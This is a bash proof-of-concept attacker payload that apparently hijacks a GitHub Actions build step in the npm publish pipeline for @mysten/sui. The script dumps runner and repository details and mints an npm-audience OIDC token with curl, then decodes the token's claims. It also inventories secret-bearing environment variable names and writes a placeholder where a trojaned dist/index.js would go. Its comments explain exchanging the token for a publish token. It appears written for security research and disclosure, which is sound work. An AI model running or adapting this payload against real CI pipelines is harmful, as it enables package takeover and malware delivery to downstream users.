#!/usr/bin/env bash
# DITTO ATTACKER PAYLOAD — replaces what would have been the legitimate `tsdown` build.
# Proves arbitrary code execution inside the supply-chain publish job AND that an OIDC
# token can be minted for the npm audience (the operative supply-chain primitive).
# Marker: PWN_C_a1754db1

set +e

echo "::group::PWN_C_a1754db1 :: attacker code executing in supply-chain publish job"
echo "=================================================="
echo "PWN_MARKER:     PWN_C_a1754db1_$(date +%s)"
echo "GITHUB_REPOSITORY:      $GITHUB_REPOSITORY"
echo "GITHUB_REPOSITORY_ID:   ${GITHUB_REPOSITORY_ID:-n/a}"
echo "GITHUB_REPOSITORY_OWNER:$GITHUB_REPOSITORY_OWNER"
echo "GITHUB_WORKFLOW:        $GITHUB_WORKFLOW"
echo "GITHUB_WORKFLOW_REF:    ${GITHUB_WORKFLOW_REF:-n/a}"
echo "GITHUB_REF:             $GITHUB_REF"
echo "GITHUB_SHA:             $GITHUB_SHA    <-- if this is the ATTACKER fork SHA, the chain has crossed the trust boundary"
echo "GITHUB_ACTOR:           $GITHUB_ACTOR"
echo "GITHUB_EVENT_NAME:      $GITHUB_EVENT_NAME"
echo "GITHUB_TRIGGERING_ACTOR:${GITHUB_TRIGGERING_ACTOR:-n/a}"
echo "RUNNER_NAME:            $RUNNER_NAME"
echo "PWD:                    $(pwd)"
echo "pkg.json path:          $(cat package.json | head -3)"
echo "=================================================="

echo "--- OIDC capability probe (the actual supply-chain attack capability) ---"
echo "ACTIONS_ID_TOKEN_REQUEST_URL set:   $([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo YES || echo no)"
echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN set: $([ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ] && echo YES || echo no)"
echo "ACTIONS_ID_TOKEN_REQUEST_URL len:   ${#ACTIONS_ID_TOKEN_REQUEST_URL}"
echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN len: ${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"

if [ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]; then
  echo ""
  echo "--- Minting an OIDC token for audience npm:registry.npmjs.org ---"
  http_code=$(curl -sS -o /tmp/oidc.json -w "%{http_code}" \
    -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
    "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=npm:registry.npmjs.org" || echo "curl-failed")
  echo "OIDC_HTTP_STATUS:    $http_code"
  echo "OIDC_RESPONSE_SIZE:  $(wc -c </tmp/oidc.json 2>/dev/null || echo 0) bytes"
  python3 - <<'PY'
import json, base64
try:
    j = json.load(open('/tmp/oidc.json'))
except Exception as e:
    print('OIDC_JSON_PARSE_ERROR:', e)
    print('BODY_HEAD:', open('/tmp/oidc.json').read()[:300])
    raise SystemExit(0)
v = j.get('value', '')
if not v:
    print('OIDC_RESULT: response had no "value" field, body=', json.dumps(j)[:300])
    raise SystemExit(0)
parts = v.split('.')
print('OIDC_JWT_SEGMENTS:', len(parts), '(expected 3 for header.payload.signature)')
def b64(s): return base64.urlsafe_b64decode(s + '=' * ((4 - len(s) % 4) % 4))
hdr = json.loads(b64(parts[0]))
pl  = json.loads(b64(parts[1]))
print('OIDC_HEADER:', json.dumps(hdr))
# Print payload claims selectively — never print the signed segment (parts[2]).
for k in ('iss','aud','sub','repository','repository_owner','repository_id',
          'workflow','workflow_ref','event_name','ref','sha','actor',
          'job_workflow_ref','runner_environment','run_id','run_attempt'):
    if k in pl:
        print(f'OIDC_PAYLOAD.{k}:', pl[k])
print('OIDC_FULL_JWT_LENGTH:', len(v))
print('OIDC_SIGNED_SEGMENT_LENGTH:', len(parts[2]))
print('OIDC_RESULT: SUCCESS — token minted, claims attest as MystenLabs-equivalent owner,')
print('             real attacker would now POST this JWT to https://registry.npmjs.org/-/npm/v1/oidc/token/exchange')
print('             and receive a short-lived npm publish token authorized for the project.')
PY
else
  echo "OIDC_RESULT: token env vars not set in this step — id-token:write permission not present at job level"
fi

echo ""
echo "--- Secret env-key inventory (values redacted by Actions if registered as secrets) ---"
env | awk -F= '{print $1}' | grep -E '^(NPM_|NODE_AUTH|AWS_|GCP_|GOOGLE_|GH_|GITHUB_|ACTIONS_|RUNNER_|HF_|CODECOV_|CI_)' | sort -u | head -40

echo ""
echo "--- File the legitimate build would have produced: dist/index.js ---"
# A real attacker would write a trojaned bundle here that contains exfil/backdoor code.
# For the PoC, just leave a marker file so upload-artifact has something to package.
mkdir -p dist
cat > dist/index.js <<'JS'
// PWN_C_a1754db1: this file would be the trojaned bundle a real attacker publishes.
// Every downstream consumer of @mysten/sui via npm install would execute this on import.
console.log('PWN_C_a1754db1: trojaned bundle from supply-chain RCE PoC');
JS
echo "wrote dist/index.js ($(wc -c < dist/index.js) bytes)"

echo "::endgroup::"

# Exit cleanly so the chain continues to the dry-run publish step.
exit 0
